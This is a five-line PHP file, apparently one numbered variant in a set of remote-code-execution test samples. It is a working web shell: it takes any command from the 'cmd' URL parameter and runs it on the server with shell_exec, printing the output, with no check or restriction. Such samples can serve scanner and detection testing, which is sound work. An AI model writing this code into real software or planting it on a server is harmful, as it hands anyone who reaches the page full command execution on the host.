<?php
// RCE test variation #915
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>